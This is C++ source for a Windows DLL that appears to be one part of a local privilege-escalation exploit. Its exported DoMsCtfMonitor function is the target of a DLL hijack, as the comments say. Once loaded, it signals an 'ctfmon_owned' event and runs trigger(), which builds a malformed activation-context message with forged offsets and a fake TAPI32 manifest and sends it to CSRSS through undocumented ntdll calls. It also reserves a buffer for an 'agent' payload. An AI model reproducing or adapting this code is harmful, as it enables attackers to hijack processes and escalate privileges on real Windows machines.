////////////////////////////////////////////////////////////////////////

#include "pch.h"
#include "Header.h"
#include <Windows.h>
#include <pathcch.h>

#pragma comment(lib, "pathcch.lib")


////////////////////////////////////////////////////////////////////////



////////////////////////////////////////////////////////////////////////

// The only exported function required


BYTE g_Agent[0x2000] = { 'C' , 'A' , 'F' , 'E' , 'C' , 'A' , 'F' , 'E' }; // buffer to copy the agent

void trigger() {
    HMODULE Ntdll = LoadLibraryW(L"Ntdll.dll");
    CsrAllocateCaptureBuffer = (f_CsrAllocateCaptureBuffer)GetProcAddress(
        Ntdll, "CsrAllocateCaptureBuffer");

    CsrClientCallServer =
        (f_CsrClientCallServer)GetProcAddress(Ntdll, "CsrClientCallServer");
    CsrCaptureMessageString = (f_CsrCaptureMessageString)GetProcAddress(
        Ntdll, "CsrCaptureMessageString");

    const int HEADER_SIZE = 0x40;
    const int TOTAL_SIZE = 0x40 + 0x1f8;



    TotalMessage* _TotalMessage = (TotalMessage*)malloc(TOTAL_SIZE);

    if (_TotalMessage == NULL) {
        return;
    }

    memset(_TotalMessage, 0, TOTAL_SIZE);



    PVOID CaptureBuffer = CsrAllocateCaptureBuffer(4, 0x300);

    _BASE_SXS_CREATE_ACTIVATION_CONTEXT_MSG MessageData;

    memset(&MessageData, 0, sizeof(MessageData));

    int dwFlags = ACTCTX_FLAG_PROCESSOR_ARCHITECTURE_VALID | ACTCTX_FLAG_SOURCE_IS_ASSEMBLYREF;

    MessageData.Flags = dwFlags;
    MessageData.ProcessorArchitecture = 9;
    MessageData.FileTime = 0;
    MessageData.ResourceName = 0;
    MessageData.ActivationContextData = NULL;
    MessageData.RunLevel.UiAccess = 0;
    MessageData.Manifest.FileType = 1;
    MessageData.Manifest.PathType = 1;
    MessageData.Manifest.HandleType = BASE_MSG_HANDLETYPE_CLIENT_PROCESS;

    MessageData.Policy.FileType = 1;
    MessageData.Policy.PathType = 1;
    MessageData.Policy.HandleType = BASE_MSG_HANDLETYPE_CLIENT_PROCESS;



    memcpy((char*)_TotalMessage + 0x40, &MessageData, sizeof(MessageData));


    _TotalMessage->message.ResourceName = 0x7c;

    UNICODE_STRING ManifestPath;
    UNICODE_STRING PolicyPath;
    UNICODE_STRING AssemblyDirectory;
    UNICODE_STRING CultureFallbacks;

    LPWSTR get_system32_buffer = (LPWSTR)malloc( 1000);

    if (get_system32_buffer == NULL) {
        return;
    }

	LPWSTR get_tapi32_buffer = (LPWSTR)malloc( 1000);

    if (get_tapi32_buffer == NULL) {
		return;
	}

    LPWSTR get_config_buffer = (LPWSTR)malloc( 1000);

    if (get_config_buffer == NULL) {
		return;
	}

    LPWSTR get_asm_buffer = (LPWSTR)malloc( 1000);

    if (get_asm_buffer == NULL) {
		return;
	}


	GetSystemDirectoryW(get_system32_buffer, 1000);

	PathCchCombine(get_tapi32_buffer,  1000, get_system32_buffer, L"tapi32.dll");
    PathCchCombine(get_config_buffer,  1000, get_system32_buffer, L"TAPI32.dll.124.Config");
    PathCchCombine(get_asm_buffer,  1000, get_system32_buffer, L"\\Windows\\system32\\");




    ManifestPath.Buffer = get_tapi32_buffer;
    PolicyPath.Buffer = get_config_buffer;											  // (PWSTR)L"C:\\windows\\system32\\TAPI32.dll.124.Config";
    AssemblyDirectory.Buffer = get_asm_buffer;                                    // (PWSTR)L"C:\\windows\\system32\\";

    CultureFallbacks.Buffer = (PWSTR)L"en-US\x00\x00\x00\x00\x00\x00\x00\x10\x00\x30\x00";


    ManifestPath.Length = lstrlenW(ManifestPath.Buffer);
    PolicyPath.Length = lstrlenW(PolicyPath.Buffer);
    AssemblyDirectory.Length = lstrlenW(AssemblyDirectory.Buffer);
    CultureFallbacks.Length = lstrlenW(CultureFallbacks.Buffer);

    ManifestPath.MaximumLength = ManifestPath.Length + 2;
    PolicyPath.MaximumLength = PolicyPath.Length + 2;
    AssemblyDirectory.MaximumLength = AssemblyDirectory.Length + 2;
    CultureFallbacks.MaximumLength = CultureFallbacks.Length + 2;



    CaptureUnicodeString(CaptureBuffer, (char *)&_TotalMessage->message.Manifest.Path, ManifestPath.Buffer);
    CaptureUnicodeString(CaptureBuffer,  (char *)&_TotalMessage->message.Policy.Path, PolicyPath.Buffer);
    CaptureUnicodeString(CaptureBuffer, (char *)&_TotalMessage->message.AssemblyDirectory, AssemblyDirectory.Buffer);
    CaptureUnicodeString(CaptureBuffer, (char *)&_TotalMessage->message.CultureFallbacks, CultureFallbacks.Buffer);




    _TotalMessage->message.CultureFallbacks.Length = 0x14;
    _TotalMessage->message.CultureFallbacks.MaximumLength = 0x16;

    _TotalMessage->message.Manifest.HandleType = (BYTE) 0x2;
    _TotalMessage->message.Manifest.Offset = 0x5;
    _TotalMessage->message.Manifest.Size = 0x45;

    _TotalMessage->message.Policy.HandleType = (BYTE) 0x2;
    _TotalMessage->message.Policy.Offset = 0x5;
    _TotalMessage->message.Policy.Size = 0x45;

    PCHAR direccion =(PCHAR) _TotalMessage->message.CultureFallbacks.Buffer;

    *(direccion+10) =  0x00;
    *(direccion+11) =  0x00;
    *(direccion+12) =  0x65;
    *(direccion + 13) = 0x0;
    *(direccion + 14) = 0x6e;
    *(direccion + 15) = 0x0;

    *(direccion + 16) = 0x0;
    *(direccion + 17) = 0x0;
    *(direccion + 18) = 0x0;
    *(direccion + 19) = 0x0;
    *(direccion + 20) = 0x0;
    *(direccion + 21) = 0x0;
    *(direccion + 22) = 0x0;
    *(direccion + 23) = 0x10;
    *(direccion + 24) = 0x0;
    *(direccion + 25) = 0x30;
    *(direccion + 26) = 0x0;
    *(direccion + 27) = 0x0;
    *(direccion + 28) = 0x0;
    *(direccion + 29) = 0x0;



    HANDLE h=CreateFileW(get_tapi32_buffer, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (h == INVALID_HANDLE_VALUE) {
		return;
	}

	FILETIME pow;
	FILETIME pow2;
	FILETIME pow3;

	GetFileTime(h,&pow, &pow2, &pow3);


	//combine two ints in one __int64
	__int64 value = pow3.dwHighDateTime;
	value = value << 32;
	value = value | pow3.dwLowDateTime;



    _TotalMessage->message.FileTime = value; //0x01D861D2216CC83A;

    CloseHandle(h);


    const char* MANIFEST_CONTENTS =
        "<?xml version='1.0' encoding='UTF-8' standalone='yes'?> "
        "<assembly xmlns='urn:schemas-microsoft-com:asm.v1' manifestVersion='1.0'> "
        "<assemblyIdentity "
        "version='6.1.0.0' "
        "processorArchitecture='amd64' "
        "name='TAPI32' "
        "type='win32' "
        "/> "
        "<description>TAPI 2.x Client</description> "
        "<dependency> "
        "<dependentAssembly> "
        "<assemblyIdentity "
        "type='win32' "
        "name='tapi32' "
        "version='124.0.2478.51' "
        "processorArchitecture='amd64' "
        "language='tasks' "
        "publicKeyToken='6595b64144ccf1df' "
        "/> "
        "</dependentAssembly> "
        "</dependency> "

        "</assembly>";





    _TotalMessage->message.Manifest.Offset= (unsigned long long)MANIFEST_CONTENTS;
    _TotalMessage->message.Manifest.Size = strlen(MANIFEST_CONTENTS);

    _TotalMessage->message.Manifest.FileType = 1;
    _TotalMessage->message.Manifest.PathType = 1;


    _TotalMessage->message.Manifest.Handle = (HANDLE) - 1;





    NTSTATUS res = CsrClientCallServer(_TotalMessage, CaptureBuffer, 0x1001001e, 0x1F8);


}

VOID
RunPayload(
    VOID
)
{
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    si = { 0 };
    pi = { 0 };

    trigger();


}

BOOL APIENTRY DllMain(HMODULE hModule,
    DWORD  ul_reason_for_call,
    LPVOID lpReserved
)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}


////////////////////////////////////////////////////////////////////////

// The only exported function required
extern "C" __declspec(dllexport) int DoMsCtfMonitor(void)
{
    static int first_time = TRUE;
    HANDLE event;

    // If it's the first time
    if (first_time == TRUE)
    {
        // Only once
        first_time = FALSE;

        // Opening event object

        event = OpenEvent(EVENT_MODIFY_STATE, FALSE, "ctfmon_owned");

        // Telling the exploit that the DLL hijacking worked
        SetEvent(event);

        // Launching Notepad

        RunPayload();
        //ShellExecute(0x0, "open", "TCMSETUP.exe", "", NULL, 1);

        // Closing event
        CloseHandle(event);


        return (TRUE);
    }
}
